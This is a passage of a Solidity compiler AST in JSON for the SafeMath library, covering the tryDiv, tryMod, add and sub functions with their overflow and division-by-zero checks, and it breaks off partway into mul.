									"src": "1408:435:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 127,
										"nodeType": "Block",
										"src": "2068:76:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 115,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 113,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 106,
														"src": "2082:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 114,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2087:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2082:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 120,
												"nodeType": "IfStatement",
												"src": "2078:29:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 116,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2098:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 117,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2105:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 118,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "2097:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 112,
													"id": 119,
													"nodeType": "Return",
													"src": "2090:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 121,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2125:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 124,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 122,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 104,
																"src": "2131:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"id": 123,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 106,
																"src": "2135:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2131:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 125,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "2124:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 112,
												"id": 126,
												"nodeType": "Return",
												"src": "2117:20:0"
											}
										]
									},
									"documentation": {
										"id": 102,
										"nodeType": "StructuredDocumentation",
										"src": "1849:138:0",
										"text": " @dev Returns the division of two unsigned integers, with a division by zero flag.\n _Available since v3.4._"
									},
									"id": 128,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryDiv",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 107,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 104,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 128,
												"src": "2008:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 103,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2008:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 106,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 128,
												"src": "2019:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 105,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2019:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2007:22:0"
									},
									"returnParameters": {
										"id": 112,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 109,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 128,
												"src": "2053:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 108,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2053:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 111,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 128,
												"src": "2059:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 110,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2059:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2052:15:0"
									},
									"scope": 354,
									"src": "1992:152:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 154,
										"nodeType": "Block",
										"src": "2379:76:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 142,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 140,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 133,
														"src": "2393:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 141,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "2398:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "2393:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 147,
												"nodeType": "IfStatement",
												"src": "2389:29:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 143,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2409:5:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 144,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "2416:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 145,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "2408:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 139,
													"id": 146,
													"nodeType": "Return",
													"src": "2401:17:0"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 148,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2436:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 151,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 149,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 131,
																"src": "2442:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "%",
															"rightExpression": {
																"argumentTypes": null,
																"id": 150,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 133,
																"src": "2446:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2442:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 152,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "2435:13:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 139,
												"id": 153,
												"nodeType": "Return",
												"src": "2428:20:0"
											}
										]
									},
									"documentation": {
										"id": 129,
										"nodeType": "StructuredDocumentation",
										"src": "2150:148:0",
										"text": " @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n _Available since v3.4._"
									},
									"id": 155,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 134,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 131,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 155,
												"src": "2319:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 130,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2319:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 133,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 155,
												"src": "2330:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 132,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2330:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2318:22:0"
									},
									"returnParameters": {
										"id": 139,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 136,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 155,
												"src": "2364:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 135,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2364:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 138,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 155,
												"src": "2370:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 137,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2370:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2363:15:0"
									},
									"scope": 354,
									"src": "2303:152:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 180,
										"nodeType": "Block",
										"src": "2757:108:0",
										"statements": [
											{
												"assignments": [
													166
												],
												"declarations": [
													{
														"constant": false,
														"id": 166,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 180,
														"src": "2767:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 165,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2767:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 170,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 169,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 167,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 158,
														"src": "2779:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 168,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 160,
														"src": "2783:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2779:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2767:17:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 174,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 172,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 166,
																"src": "2802:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 173,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 158,
																"src": "2807:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2802:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206164646974696f6e206f766572666c6f77",
															"id": 175,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2810:29:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															},
															"value": "SafeMath: addition overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															}
														],
														"id": 171,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "2794:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 176,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2794:46:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 177,
												"nodeType": "ExpressionStatement",
												"src": "2794:46:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 178,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 166,
													"src": "2857:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 164,
												"id": 179,
												"nodeType": "Return",
												"src": "2850:8:0"
											}
										]
									},
									"documentation": {
										"id": 156,
										"nodeType": "StructuredDocumentation",
										"src": "2461:224:0",
										"text": " @dev Returns the addition of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `+` operator.\n Requirements:\n - Addition cannot overflow."
									},
									"id": 181,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 161,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 158,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "2703:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 157,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2703:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 160,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "2714:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 159,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2714:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2702:22:0"
									},
									"returnParameters": {
										"id": 164,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 163,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "2748:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 162,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2748:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2747:9:0"
									},
									"scope": 354,
									"src": "2690:175:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 202,
										"nodeType": "Block",
										"src": "3203:88:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 194,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 192,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 186,
																"src": "3221:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 193,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 184,
																"src": "3226:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "3221:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a207375627472616374696f6e206f766572666c6f77",
															"id": 195,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3229:32:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															},
															"value": "SafeMath: subtraction overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															}
														],
														"id": 191,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3213:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 196,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3213:49:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 197,
												"nodeType": "ExpressionStatement",
												"src": "3213:49:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 200,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 198,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 184,
														"src": "3279:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 199,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 186,
														"src": "3283:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3279:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 190,
												"id": 201,
												"nodeType": "Return",
												"src": "3272:12:0"
											}
										]
									},
									"documentation": {
										"id": 182,
										"nodeType": "StructuredDocumentation",
										"src": "2871:260:0",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 203,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 187,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 184,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 203,
												"src": "3149:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 183,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3149:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 186,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 203,
												"src": "3160:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 185,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3160:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3148:22:0"
									},
									"returnParameters": {
										"id": 190,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 189,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 203,
												"src": "3194:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 188,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3194:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3193:9:0"
									},
									"scope": 354,
									"src": "3136:155:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 236,
										"nodeType": "Block",
										"src": "3605:148:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 215,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 213,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 206,
														"src": "3619:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 214,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3624:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "3619:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 218,
												"nodeType": "IfStatement",
												"src": "3615:20:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 216,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3634:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"functionReturnParameters": 212,
													"id": 217,
													"nodeType": "Return",
													"src": "3627:8:0"
												}
											},
											{
												"assignments": [
													220
												],
												"declarations": [
													{
														"constant": false,
														"id": 220,
